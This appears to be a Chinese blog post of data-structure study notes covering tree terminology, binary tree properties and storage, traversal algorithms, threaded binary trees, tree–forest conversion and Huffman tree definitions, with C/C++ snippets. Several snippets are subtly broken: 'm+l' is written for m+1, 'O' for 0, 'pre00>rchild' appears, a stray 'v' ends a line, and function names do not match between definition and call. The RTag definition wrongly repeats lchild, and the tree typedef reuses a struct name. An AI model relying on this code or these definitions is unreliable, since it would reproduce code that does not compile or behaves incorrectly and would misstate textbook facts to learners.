<p>　　（1）<strong>结点</strong>：数中的一个独立单元。包含一个数据元素及若干指向其子树的分支，如图的A、B、C、D等。</p>
<p>　　（2）<strong>结点的度</strong>：结点拥有的子树数。如，A的度是3，C的度是1，F的度是0。</p>
<p>　　（3）<strong>树的度</strong>：树内各结点度的最大值</p>
<p>　　（4）<strong>叶子</strong>：度为0的结点称为<strong>叶子或终端结点</strong>。比如，K、L、F、G、M、I、J都是树的叶子。</p>
<p>　　（5）<strong>非终端结点</strong>：度不为0<strong>的结点称为非终端结点或分支节点</strong>。除根结点之外，也叫内部节点。</p>
<p>　　（6）<strong>双亲和孩子</strong>：结点的子树的根称为该结点的孩子，相应地，该结点称为孩子的双亲。如，B的双亲为A，B的孩子有E和Ｆ。</p>
<p>　　（７）<strong>层次</strong>：结点的层次从根开始定义，根为第一层，根的孩子为第二层等等。</p>
<p>　　（8）<strong>树的深度</strong>：树中结点的最大层次称为树的深度或高度，上图树的深度为4。</p>
<h3 id="5-1-3-二叉树的定义"><a href="#5-1-3-二叉树的定义" class="headerlink" title="5.1.3 二叉树的定义"></a>5.1.3 二叉树的定义</h3><p>　　二叉树（Binary Tree）是n(n&gt;=0)个结点所构成的集合，它或为空树(n=0)；或为非空树，对于非空树T：</p>
<p>（1）有且仅有一个称之为根的结点；</p>
<p>（2）除根结点之外的其余结点分为两个互不相交的子集T<sub>1</sub>和T<sub>2</sub>，分别称为T的左子树和右子树，且T<sub>1</sub>和T<sub>2</sub>本身又都是二叉树。</p>
<p><strong>二叉树的基本特点</strong></p>
<ul>
<li>结点的度都&lt;=2</li>
<li>有序树（子树有序，不能颠倒）</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617844641-image-20210408091721508.png" alt="image-20210408091721508" style="zoom:67%;" /></p>
<h2 id="5-2-二叉树的性质和存储结构"><a href="#5-2-二叉树的性质和存储结构" class="headerlink" title="5.2 二叉树的性质和存储结构"></a>5.2 二叉树的性质和存储结构</h2><h3 id="5-2-1-二叉树的性质"><a href="#5-2-1-二叉树的性质" class="headerlink" title="5.2.1 二叉树的性质"></a>5.2.1 二叉树的性质</h3><p><strong>性质1</strong> 在二叉树的第i层上至多有2<sup>i-1</sup>个节点（i&gt;=1）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617876251-image-20210408180411607.png" alt="image-20210408180411607" style="zoom:67%;" /></p>
<p><strong>性质2</strong> 深度为k的二叉树至多有2<sup>k</sup>-1个节点（k&gt;=1）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617876268-image-20210408180428251.png" alt="image-20210408180428251" style="zoom:67%;" /></p>
<p><strong>性质3</strong> 对任何一个二叉树T，如果其终端节点数为n<sub>0</sub>，度为2的节点数为n<sub>2</sub>，则n<sub>0</sub>=n<sub>2</sub>+1。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617876291-image-20210408180451411.png" alt="image-20210408180451411" style="zoom:67%;" /></p>
<p><strong>特殊的二叉树</strong></p>
<p>（1）满二叉树：一个深度为k且有2<sup>k</sup>-1个结点的二叉树。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617876532-image-20210408180852817.png" alt="image-20210408180852817" style="zoom: 80%;" /></p>
<p>（2）完全二叉树：深度为k的，有n个节点的二叉树，当且仅当其没一个节点斗鱼深度为k的满二叉树中编号从1至n的结点一一对应（且最后一层叶子不满，全部集中在左边）</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617876541-image-20210408180901861.png" alt="image-20210408180901861" style="zoom: 80%;" /></p>
<p><strong>性质4</strong> 具有n个结点的完全二叉树的深度为：</p>
<script type="math/tex; mode=display">
\left \lfloor \log_2n\right \rfloor+1</script><blockquote>
<script type="math/tex; mode=display">
\left \lfloor x\right \rfloor取不大于x的最大整数，\left \lceil x \right \rceil取不小于x的最小整数。</script></blockquote>
<p><strong>性质5</strong> 如果对一棵有n个结点的完全二叉树的结点按层序编号（从第1层到第[log<sub>2</sub>n]+1层，每层从左到右),则对任一结点i（1&lt;=i&lt;=n),有：</p>
<p>（1）如果i＝1，则结点i无双亲，是二叉树的根；如果i&gt;1，则其双亲是结点[i/2]。</p>
<p> （2）如果2i&gt;n，则结点i无左孩子（结点i为叶子结点）；若2i==n，其左孩子是结点2i（i为最后一个非叶子结点）。</p>
<p> （3）如果2i＋1&gt;n，则结点i无右孩子；若2i＋1==n ，其右孩子是结点2i＋1（i为最后一个非叶子结点）。</p>
<h3 id="5-2-2-二叉树的存储结构"><a href="#5-2-2-二叉树的存储结构" class="headerlink" title="5.2.2 二叉树的存储结构"></a>5.2.2 二叉树的存储结构</h3><p><strong>1 顺序存储结构</strong></p>
<p><strong>2 链式存储结构</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617786182-image-20210407170302561.png" alt="image-20210407170302561"></p>
<p>如图 1 所示，此为一棵普通的二叉树，若将其采用链式存储，则只需从树的根节点开始，将各个节点及其左右孩子使用链表存储即可。因此，图 1 对应的链式存储结构如图 2 所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617786227-image-20210407170347593.png" alt="image-20210407170347593"></p>
<p>由图 2 可知，采用链式存储二叉树时，其节点结构由 3 部分构成（如图 3 所示）：</p>
<ul>
<li>指向左孩子节点的指针（Lchild）；</li>
<li>节点存储的数据（data）；</li>
<li>指向右孩子节点的指针（Rchild）；</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617786252-image-20210407170412791.png" alt="image-20210407170412791"></p>
<p>表示该节点结构的 C 语言代码为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span>  </span><br><span class="line">    TElemType data;<span class="comment">//数据域   </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span><span class="comment">//左右孩子指针    </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">parent</span>;</span><span class="comment">//可以有可以没有</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure>
<h2 id="5-3-遍历二叉树和线索二叉树"><a href="#5-3-遍历二叉树和线索二叉树" class="headerlink" title="5.3 遍历二叉树和线索二叉树"></a>5.3 遍历二叉树和线索二叉树</h2><h3 id="5-3-1-遍历二叉树及其应用"><a href="#5-3-1-遍历二叉树及其应用" class="headerlink" title="5.3.1 遍历二叉树及其应用"></a>5.3.1 遍历二叉树及其应用</h3><h4 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h4><p>二叉树由3个基本单元组成：根结点、左子树、右子树。因此可以分为三个遍历部分。可以参考具体<a href="https://www.pianshen.com/article/7106254596/">链接</a>。</p>
<ul>
<li><p>DLR——先序遍历，先根再左再右</p>
</li>
<li><p>LDR——中序遍历，先左再根再右</p>
</li>
<li><p>LRD——后序遍历，先左再右再根</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1617788435-image-20210407174035666.png" alt="image-20210407174035666"></p>
<p><strong>先序遍历</strong></p>
<blockquote>
<p>先序遍历：访问根节点，访问当前节点的左子树；若当前节点无左子树，则访问当前节点的右子树。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619053575-image-20210422090614930.png" alt="image-20210422090614930"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">Status PreOrder <span class="title">Traverse</span><span class="params">(BiTree T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;T-&gt;data;</span><br><span class="line">        PreOrderTraverse(T-&gt;lchild);</span><br><span class="line">        PreOrderTraverse(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>中序遍历</strong></p>
<blockquote>
<p>中序遍历：访问当前节点的左子树；访问根节点；访问当前节点的右子树。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619053611-image-20210422090651292.png" alt="image-20210422090651292"></p>
<p><strong>中序遍历的递归算法</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BiTree T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)&#123;</span><br><span class="line">        InOrderTraverse(T-&gt;lchild);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;T-&gt;data;</span><br><span class="line">        InorderTraverse(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>中序遍历的非递归算法</strong></p>
<p>①初始化一个空栈S，指针p指向根结点</p>
<p>②申请一个结点空间q，用来存放栈顶弹出的元素</p>
<p>③当p非空或者栈S非空时，循环执行以下操作：</p>
<ul>
<li>如果p非空，则将p进栈，p指向该结点的左孩子；</li>
<li>如果p为空，则弹出栈顶元素并访问，将p指向该结点的右孩子。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BiTree T)</span></span>&#123;</span><br><span class="line">    InitStack(S);</span><br><span class="line">    p=T;</span><br><span class="line">    q=<span class="keyword">new</span> BiTNode;</span><br><span class="line">    <span class="keyword">while</span>(p||!StackEmpty(S))&#123;</span><br><span class="line">        <span class="keyword">if</span>(p)&#123;<span class="comment">//p非空</span></span><br><span class="line">            Push(S,p);<span class="comment">//根指针进栈</span></span><br><span class="line">            p=p-&gt;lchild;<span class="comment">//根指针进栈，遍历左子树 </span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//p空</span></span><br><span class="line">            Pop(S,q);<span class="comment">//退栈</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;q-&gt;data;<span class="comment">//访问根结点</span></span><br><span class="line">            p=q-&gt;rchild;<span class="comment">//遍历右子树</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>后序遍历</strong></p>
<blockquote>
<p>后序遍历：从根节点出发，依次遍历各节点的左右子树，直到当前节点左右子树遍历完成后，才访问该节点元素。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619053789-image-20210422090949365.png" alt="image-20210422090949365"></p>
<p><strong>层序遍历</strong></p>
<blockquote>
<p>层次遍历：从上往下一层一层遍历。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619053809-image-20210422091009192.png" alt="image-20210422091009192"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LevelTreaverse</span><span class="params">(BiTree T)</span></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span> &lt;BiNode *&gt; que;</span><br><span class="line">    <span class="keyword">if</span>(!T)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    que.push(T);</span><br><span class="line">    <span class="keyword">while</span>(!que.empty())&#123;</span><br><span class="line">        BiNode *p = que.front();</span><br><span class="line">        que.pop();</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;p-&gt;data;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;lchild!=<span class="literal">NULL</span>)</span><br><span class="line">            que.push(p-&gt;lchild);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rchild!=<span class="literal">NULL</span>)</span><br><span class="line">			que.push(p-&gt;rchild);v</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="二叉树的遍历应用"><a href="#二叉树的遍历应用" class="headerlink" title="二叉树的遍历应用"></a>二叉树的遍历应用</h4><ul>
<li><strong>先序遍历的顺序建立二叉链表</strong></li>
</ul>
<blockquote>
<p>1.扫描序列，读入字符ch。</p>
<p>2.如果ch是一个“#”字符，则表明该二叉树为空树，即T为NULL；否则执行以下操作：</p>
<p>①申请一个节点空间T；</p>
<p>②将ch赋给T-&gt;data;</p>
<p>③递归创建T的左子树；</p>
<p>④递归创建T的右子树；</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreatBiTree</span><span class="params">(BiTree &amp;T)</span></span>&#123;</span><br><span class="line">    <span class="comment">//按先序次序输入二叉树中的结点的值，创建二叉链表表示二叉树T</span></span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;ch;</span><br><span class="line">    <span class="keyword">if</span>(ch==<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">        T=<span class="literal">NULL</span>; <span class="comment">//递归结束，建立空树</span></span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//递归创建二叉树</span></span><br><span class="line">        T=<span class="keyword">new</span> BiTNode;<span class="comment">//生成根节点</span></span><br><span class="line">        T-&gt;data=ch;<span class="comment">//根结点数据域为ch</span></span><br><span class="line">        CreateBiTree(T-&gt;lchild);<span class="comment">//递归创建左子树</span></span><br><span class="line">        CreateBiTree(T-&gt;rchild);<span class="comment">//递归创建右子树</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>复制二叉树</strong></li>
</ul>
<blockquote>
<p>①若二叉树不空，则首先复制根结点（相当于先序遍历算法中访问根节点的语句）</p>
<p>②然后分别复制二叉树根结点的左子树和右子树（相当于先序遍历中递归遍历左子树和右子树的语句）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Copy</span><span class="params">(BiTree T, BiTree &amp;NewT)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        NewT=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        NewT=<span class="keyword">new</span> BiTNode;</span><br><span class="line">        NewT-&gt;data=T-&gt;data;</span><br><span class="line">        Copy(T-&gt;lchild,NewT-&gt;lchild);</span><br><span class="line">        Copy(T-&gt;rchild,NewT-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>计算二叉树深度</strong></li>
</ul>
<blockquote>
<p>如果是空树，递归结束，深度为0，否则</p>
<ul>
<li>递归计算左子树的深度为m；</li>
<li>递归计算右子树的深度为n；</li>
<li>如果m&gt;n，二叉树的深度为m+1，否则n+1。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Depth</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//计算二叉树T的深度</span></span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//如果是空树，深度为0, 递归结束</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        m=Depth(T-&gt;lchild);<span class="comment">//递归计算左子树的深度记为m</span></span><br><span class="line">        n=Depth(T-&gt;rchild);<span class="comment">//递归计算右子树的深度记为n</span></span><br><span class="line">        <span class="keyword">if</span>(m&gt;n) <span class="keyword">return</span>(m+l);<span class="comment">//二叉树的深度为m与n的较大者加1</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span>(n+l);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                                             </span><br></pre></td></tr></table></figure>
<ul>
<li><strong>统计二叉树中结点的个数</strong></li>
</ul>
<blockquote>
<p>如果是空树，则结点个数为0,；苟泽，结点个数为左子树的结点个数加上右子树的结点个数再加上 1</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">NodeCount</span><span class="params">(BiTree T)</span></span>&#123;</span><br><span class="line">    <span class="comment">//统计二叉树T中结点的个数</span></span><br><span class="line">    <span class="keyword">if</span> (T==<span class="literal">NULL</span>) <span class="keyword">return</span> O; <span class="comment">//如果是空树，则结点个数为0, 递归结束</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> NodeCount (T-&gt;lchild) +Node Count (T-&gt;rchild) + <span class="number">1</span>;<span class="comment">//否则结点个数为左子树的结点个数＋右子树的结点个数+l</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>计算二叉树叶子结点的数</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LeadCount</span><span class="params">(BiTree T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) 	<span class="comment">//如果是空树返回0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (T-&gt;lchild == <span class="literal">NULL</span> &amp;&amp; T-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//如果是叶子结点返回1</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> LeafCount(T-&gt;lchild) + LeafCount(T-&gt;rchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<font color="ff000">在n个结点的二叉链表中，有n+1个空指针域</font>

<h3 id="5-3-2-线索二叉树"><a href="#5-3-2-线索二叉树" class="headerlink" title="5.3.2 线索二叉树"></a>5.3.2 线索二叉树</h3><p>　　遍历二叉树是以一定规则将二叉树中的结点排列成一个线性序列，得到二叉树中结点的先序序列、中序序列或后序序列。普通二叉树只能找到结点的左右孩子信息，而该结点的直接前驱和直接后继只能在遍历过程中获得。若将某种遍历序列某个结点的前驱和后继预存起来，则从第一个结点开始就能很快“顺藤摸瓜”而遍历整个树。</p>
<p>如何保存这类信息？</p>
<script type="math/tex; mode=display">
两种解决方法=\begin{cases}
增加两个域：fwd和bwd;　　　使得结构的存储密度大大降低\\
\\
利用空链域（n+1个空链域）　　　　　　　　　　
\end{cases}</script><p>所以基于某种遍历规则：<br>1）若结点有左子树，则lchild指向其左孩子；<br>       否则， lchild指向其直接前驱(即线索)；</p>
<p>2）若结点有右子树，则rchild指向其右孩子；<br>       否则， rchild指向其直接后继(即线索) 。</p>
<font color ="#0000ff">为了避免混淆，增加两个标志域</font>

<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618393158-image-20210414173918248.png" alt="image-20210414173918248"></p>
<p>其中：</p>
<script type="math/tex; mode=display">
LTag=\begin{cases}
0　lchild域指示结点的左孩子　\\
1　lchild域指示结点的前驱　　　　　　　　　　
\end{cases}</script><script type="math/tex; mode=display">
RTag=\begin{cases}
0　lchild域指示结点的左孩子　\\
1　lchild域指示结点的后继　　　　　　　　　　
\end{cases}</script><p>二叉树二叉线索类型定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiThrNode</span>&#123;</span></span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiThrNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="keyword">int</span> LTag,RTag;</span><br><span class="line">&#125;BiThrNode,*BiThrTree;</span><br></pre></td></tr></table></figure>
<p><strong>以结点p为根的子树中序线索化</strong></p>
<p>[算法步骤]</p>
<p>①如果p非空，左子树递归线索化</p>
<p>②如果p的左孩子为空，则给p加上左线索，将其LTag置为1，让p的左孩子指针指向pre（前驱）；否则将p的LTag置为0</p>
<p>③如果pre的右孩子为空，则给pre加上右线索，将其RTag置为1，让pre的右孩子指针指向p（后继）；否则将pre的RTag置为0</p>
<p>④将pre指向刚访问过的结点p，即pre=p</p>
<p>⑤右子树递归线索化</p>
<p>[算法描述]</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InThreading</span><span class="params">(BiThrTree p)</span></span>&#123;</span><br><span class="line">    <span class="comment">//pre是全局变量，初始化时右孩子指针为空，便于在树的最左点开始建线索</span></span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        InThreading(p-&gt;lchild);<span class="comment">//左子树递归线索化</span></span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;lchild)<span class="comment">//p的左孩子为空</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;LTag=<span class="number">1</span>;<span class="comment">//给p加上左线索</span></span><br><span class="line">            p-&gt;lchild=pre;<span class="comment">//p的左孩子指针指向pre（前驱）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p-&gt;LTag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(!pre-&gt;rchild)&#123;<span class="comment">//pre的右孩子为空</span></span><br><span class="line">            pre-&gt;RTag=<span class="number">1</span>;<span class="comment">//给pre加上右线索</span></span><br><span class="line">            pre00&gt;rchild=p;<span class="comment">//pre的右孩子指针指向p（后继）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            pre-&gt;RTag=<span class="number">0</span>;</span><br><span class="line">        pre=p;<span class="comment">//保持pre指向p的前驱</span></span><br><span class="line">        InThreading(p-&gt;rchild);<span class="comment">//右子树递归线索化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="5-4-树与森林"><a href="#5-4-树与森林" class="headerlink" title="5.4 树与森林"></a>5.4 树与森林</h2><h3 id="5-4-1-树的存储结构"><a href="#5-4-1-树的存储结构" class="headerlink" title="5.4.1 树的存储结构"></a>5.4.1 树的存储结构</h3><p><strong>1.双亲表示法</strong>：以一组连续空间存储树的结点，同时在结点中附设一个指针，存放双亲结点在链表中的位置。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618445484-image-20210415081124676.png" alt="image-20210415081124676" style="zoom:67%;" /></p>
<p>双亲实现树定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TREE_SIZE 100   <span class="comment">//最大结点个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PTNode</span>&#123;</span>          <span class="comment">//树结点定义</span></span><br><span class="line">    TElemType     data;                 </span><br><span class="line">    <span class="keyword">int</span>      parent;                        </span><br><span class="line">&#125; PTNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PTNode</span>&#123;</span>          <span class="comment">//树定义</span></span><br><span class="line">    PTNode   nodes[MAX_TREE_SIZE];                 </span><br><span class="line">    <span class="keyword">int</span>     r,   n;        <span class="comment">//根的位置和结点数                       </span></span><br><span class="line">&#125; PTree;</span><br></pre></td></tr></table></figure>
<p><strong>2.孩子表示法</strong>：</p>
<p>（1）多重链表法（两种）</p>
<p>（2）孩子链表法：将每个结点的孩子结点排列起来，看成一个线性表，且以单链表作存储结构，n个结点有n个孩子链表，n个头指针组成线性表。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618445972-image-20210415081932478.png" alt="image-20210415081932478" style="zoom:67%;" /></p>
<p><strong>3.孩子兄弟表示法</strong>：每个节点除值域外，还包括两个指针，分别指向该节点的第一个孩子和下一个兄弟。</p>
<p>结点结构：<img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618446095-image-20210415082134980.png" alt="image-20210415082134980"></p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618446122-image-20210415082202662.png" alt="image-20210415082202662" style="zoom:67%;" /></p>
<p>结构定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> ElemType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> &#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> *<span class="title">firstchild</span>, *<span class="title">nextsibling</span>;</span></span><br><span class="line">&#125; CSNode ，*CSTree;</span><br></pre></td></tr></table></figure>
<h3 id="5-4-2-森林与二叉树的转换"><a href="#5-4-2-森林与二叉树的转换" class="headerlink" title="5.4.2 森林与二叉树的转换"></a>5.4.2 森林与二叉树的转换</h3><p><strong>1.树—-&gt;二叉树</strong></p>
<blockquote>
<p>方法（树的孩子兄弟表示法）：</p>
<p>①加线：树中所有相邻兄弟间加一连线；<br>②抹线：对树中的每个结点，只保留其与第一个孩子间的连线，删去它与其他孩子间连线；<br>③旋转：以树根为轴心，将整棵树顺时针旋转45度，使之结构层次分明。 </p>
</blockquote>
<p>　　<font color="ff000">任何一棵树和树对应的二叉树，其根结点的右子树必空。</font></p>
<p>示例：</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1619055375-image-20210422093615176.png" alt="image-20210422093615176"></p>
<p>特点：</p>
<ul>
<li><p>左分支——-父子关系   右分支—-兄弟关系</p>
</li>
<li><p>根没有兄弟，所以一棵树转换后的二叉树一定只有左子树</p>
</li>
</ul>
<p><strong>2.森林—-&gt;二叉树</strong></p>
<p>方法：</p>
<p>①将森林中每棵树转换成相应的二叉树；<br>②第一棵二叉树不动，从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵二叉树根结点的右孩子，当所有二叉树连起来后，此时，所得二叉树即是森林转换得到的。</p>
<p>示例：</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618448379-image-20210415085939539.png" alt="image-20210415085939539" style="zoom:67%;" /></p>
<p><strong>3.二叉树—-&gt;森林/树</strong></p>
<p>①若某结点是其双亲的左孩子则把该结点的右孩子，右孩子的右孩子…都与该结点的双亲结点用线连起来；<br>②删除原二叉树中所有的双亲结点与右孩子结点间的连线；<br>③整理上两步所得的树/森林，使之结构层次分明。</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1618448401-image-20210415090001909.png" alt="image-20210415090001909" style="zoom:67%;" /></p>
<p>特点：根没有右孩子，则转换成的是树，否则转换成的是森林。</p>
<h3 id="5-4-3-森林和树的遍历"><a href="#5-4-3-森林和树的遍历" class="headerlink" title="5.4.3 森林和树的遍历"></a>5.4.3 森林和树的遍历</h3><p><strong>1.树的遍历</strong></p>
<ul>
<li><p>先根遍历：若树不空，则先访问根结点，然后依次从左到右先根遍历根的各棵子树。</p>
</li>
<li><p>后根遍历：若树不空，则先依次从左到右后根遍历根的<br> 各棵子树，然后访问根结点； </p>
</li>
</ul>
<p><strong>2.森林的遍历</strong></p>
<ul>
<li>先序遍历森林：</li>
</ul>
<p>若森林非空，则可按下述规则遍历：</p>
<p>①访问森林中第一棵树的根结点；</p>
<p>②先序遍历第一棵树的根结点的子树森林；</p>
<p>③先序遍历除去第一棵树之后剩余的树构成的森林。</p>
<ul>
<li>中序遍历森林</li>
</ul>
<p>若森林非空，则可按下述规则遍历：</p>
<p>①中序遍历森林中第一棵树的根结点的子树森林；</p>
<p>②访问第一棵树的根结点；</p>
<p>③中序遍历除去第一棵树之后剩余的树构成的森林。</p>
<h2 id="5-5-哈夫曼树及其应用"><a href="#5-5-哈夫曼树及其应用" class="headerlink" title="5.5 哈夫曼树及其应用"></a>5.5 哈夫曼树及其应用</h2><h3 id="5-5-1-哈夫曼树的基本概念"><a href="#5-5-1-哈夫曼树的基本概念" class="headerlink" title="5.5.1 哈夫曼树的基本概念"></a>5.5.1 哈夫曼树的基本概念</h3><p>　　哈夫曼树又称最优树，是一类带权路径长度最短的树。</p>
<p>（1）<strong>路径</strong>：从树中一个结点到另一个结点之间的分支构成这两个结点之间的路径。</p>
<p>（2）<strong>路径长度</strong>：路径上的分支数目称作路径长度。</p>
<p>（3）<strong>树的路径长度</strong>：从树根到每一结点的路径长度之和。</p>
<p>（4）<strong>权</strong>：赋予某个实体的一个量，是对实体的某个或某些属性的数值化描述。在数据结构中，实体有结点（元素）和边（关系）两大类， 所以对应有结点权和边权。结点权或边权具体代表什么意义，由具体情况决定。如果在一棵树中的结点上带有权值，则对应的就有带权树等概念。</p>
<p>（5）<strong>结点的带权路径长度</strong>：从该结点到树根之间的路径长度与结点上权的乘积。</p>
<p>（6）<strong>树的带权路径长度</strong>：树中所有叶子结点的带权路径长度之和，通常记作$WPL=\sum_{k=1}^{n}{w_k}{l_k}$</p>
<p>（7）<strong>哈夫曼树</strong>：假设有m个权值{$w_1,w_2,···,w_m$}，可以构造一颗含有n个叶子结点的二叉树，每个叶子结点的权为$w_i$，则其中带权路径长度WPL最小的二叉树称作最优二叉树或哈夫曼树。</p>
